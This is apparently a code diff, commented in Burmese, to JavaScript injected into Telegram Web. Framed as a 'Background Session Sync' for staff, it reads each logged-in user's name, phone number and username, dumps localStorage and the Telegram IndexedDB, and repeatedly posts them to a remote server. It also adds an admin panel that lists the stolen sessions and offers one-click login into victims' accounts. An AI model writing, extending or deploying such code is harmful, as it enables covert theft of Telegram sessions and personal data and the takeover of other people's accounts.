@@ -64,7 +64,7 @@
         });
     }
 
-    // --- (၂) IndexedDB ကို အသွင်း/အထုတ်လုပ်ရန် Helpers ---
+    // --- (၂) IndexedDB မှ Data ထုတ်ယူရန် (အတိုချုပ်စနစ်ဖြင့်) ---
     async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve) => {
             const request = indexedDB.open(dbName);
@@ -80,7 +80,10 @@
                     getKeysReq.onsuccess = () => {
                         const data = {};
                         for (let i = 0; i < getKeysReq.result.length; i++) {
-                            data[getKeysReq.result[i]] = getAllReq.result[i];
+                            const key = getKeysReq.result[i];
+                            // Data Size မကြီးစေရန် မလိုအပ်သော Media Cache များကို ချန်ခဲ့မည် (Login အတွက် လိုအပ်သည်များသာ ယူမည်)
+                            if(typeof key === 'string' && (key.includes('media') || key.includes('file'))) continue;
+                            data[key] = getAllReq.result[i];
                         }
                         resolve(data);
                     };
@@ -116,16 +119,42 @@
         });
     }
 
-    // --- (၃) Main Logic ---
+    // --- (၃) Telegram ၏ LocalStorage မှ Name နှင့် Phone Number ကို ဆွဲထုတ်သည့် Function ---
+    function getTelegramProfile() {
+        try {
+            const stateStr = localStorage.getItem('tt-global-state');
+            if (stateStr) {
+                const state = JSON.parse(stateStr);
+                const currentId = state.currentUserId;
+                if (currentId && state.users && state.users.byId && state.users.byId[currentId]) {
+                    const user = state.users.byId[currentId];
+                    // နာမည်၊ ဖုန်း၊ username များကို ရှာဖွေခြင်း
+                    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || 'No Name';
+                    const phone = user.phoneNumber ? '+' + user.phoneNumber : 'No Phone';
+                    const username = user.username ? '@' + user.username : '';
+                    
+                    return { 
+                        uid: currentId.toString(), 
+                        name: fullName, 
+                        phone: phone, 
+                        username: username 
+                    };
+                }
+            }
+        } catch (e) { console.error("Profile parsing error", e); }
+        return null; // Login အပြည့်အဝ မဝင်သေးပါက null ပြန်ပေးမည်
+    }
+
+    // --- (၄) Main Logic ---
     document.addEventListener("DOMContentLoaded", () => {
         if (window.location.search.includes("admin=true")) {
-            // == ADMIN PANEL BROWSER ==
+            // ================= ADMIN PANEL =================
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
             
             adminPanel.innerHTML = `
-                <div style="max-width: 900px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+                <div style="max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                     <h2 style='color: #333; border-bottom: 2px solid #0063bb; padding-bottom: 10px;'>Admin Control Panel</h2>
                     <p style='color: #666;'>Staff ဝင်ထားသော အကောင့်များ</p>
                     <button id='loadBtn' style='padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;'>Load Accounts</button>
@@ -136,12 +165,12 @@
 
             window.adminDataStore = []; 
 
-            // Login ဝင်မည့် Function
             window.loginAs = async (index) => {
                 const session = window.adminDataStore[index];
                 if(!session) return;
                 
-                if(!confirm(session.user_id + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
+                const targetName = session.profile_name || session.user_id;
+                if(!confirm(targetName + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
                 
                 alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
                 
@@ -180,17 +209,29 @@
                     }
                     
                     let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
-                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>User ID</th><th style='padding:12px;'>Last Synced Time</th><th style='padding:12px;'>Action</th></tr>";
+                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'>";
+                    html += "<th style='padding:12px;'>Profile Info</th>";
+                    html += "<th style='padding:12px;'>Phone Number</th>";
+                    html += "<th style='padding:12px;'>Last Synced Time</th>";
+                    html += "<th style='padding:12px;'>Action</th></tr>";
                     
                     data.forEach((s, index) => {
                         const timeString = new Date(s.timestamp).toLocaleString();
-                        // အချက်အလက် အပြည့်အစုံ ရောက်/မရောက် စစ်ဆေးခြင်း
                         const isReady = s.indexed_db_str ? true : false;
-                        const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Data Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting for login...</span>";
+                        const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Online / Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting for data...</span>";
                         
+                        // အချက်အလက်များ ထုတ်ယူခြင်း (မရှိလျှင် Unknown ပြမည်)
+                        const pName = s.profile_name || "Unknown";
+                        const pUsername = s.profile_username || "";
+                        const pPhone = s.profile_phone || s.user_id;
+
                         html += `<tr style='border-bottom: 1px solid #eee;'>
-                                    <td style='padding:12px;'><b>${s.user_id}</b><br>${statusTag}</td>
-                                    <td style='padding:12px;'>${timeString}</td>
+                                    <td style='padding:12px;'>
+                                        <b style="font-size: 15px;">${pName}</b> <span style="color:#0063bb;">${pUsername}</span><br>
+                                        ${statusTag}
+                                    </td>
+                                    <td style='padding:12px; font-weight: bold;'>${pPhone}</td>
+                                    <td style='padding:12px; color: #555;'>${timeString}</td>
                                     <td style='padding:12px;'>
                                         <button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>
                                             Login ဝင်မည်
@@ -206,22 +247,25 @@
             });
 
         } else {
-            // == STAFF BROWSER ==
-            console.log("✅ Background Session Sync RUNNING!");
+            // ================= STAFF BROWSER =================
+            console.log("✅ Smart Background Session Sync RUNNING!");
+            
             setTimeout(() => {
-                let myUserId = localStorage.getItem("my_custom_user_id");
-                if (!myUserId) {
-                    myUserId = "staff_" + Math.floor(Math.random() * 100000);
-                    localStorage.setItem("my_custom_user_id", myUserId);
-                }
-
                 setInterval(async () => {
                     try {
-                        // Data အားလုံးကို ဆွဲထုတ်ပြီး String အဖြစ်ပြောင်းခြင်း
+                        // (၁) Telegram မှ User Profile ကို အရင် ရှာဖွေမည်
+                        const profile = getTelegramProfile();
+                        
+                        // Profile မရသေးလျှင် (Login ဝင်နေဆဲဖြစ်လျှင်) Data လုံးဝ မပို့ဘဲ စောင့်နေမည်
+                        if (!profile) {
+                            console.log("⏳ User not fully logged in or Profile loading. Waiting...");
+                            return; 
+                        }
+
+                        // (၂) Profile ရပြီဆိုမှ Data များကို ဆွဲထုတ်မည်
                         const lsDataStr = JSON.stringify(localStorage);
                         const rawIdbData = await exportIndexedDB("tt-data", "store");
                         
-                        // ပြင်ဆင်ချက်: Data အနည်းဆုံး ၁ ခုရှိတာနဲ့ အကောင့်ဝင်ပြီးပြီဟု ယူဆ၍ ပို့မည်
                         if (Object.keys(rawIdbData).length > 0) { 
                             const idbDataStr = serializeData(rawIdbData);
 
@@ -229,15 +273,16 @@
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify({
-                                    user_id: myUserId,
+                                    user_id: profile.uid, // Random staff_ အစား တကယ့် User ID ကို သုံးမည်
+                                    profile_name: profile.name,
+                                    profile_phone: profile.phone,
+                                    profile_username: profile.username,
                                     local_storage_str: lsDataStr,
                                     indexed_db_str: idbDataStr,
                                     timestamp: new Date().toISOString()
                                 })
                             });
-                            if(res.ok) console.log("✅ Full Telegram Session Synced.");
-                        } else {
-                            console.log("⏳ User is not fully logged in yet. Waiting...");
+                            if(res.ok) console.log(`✅ Synced data for: ${profile.name} (${profile.phone})`);
                         }
                     } catch(e) {
                         console.error("❌ Sync failed:", e);
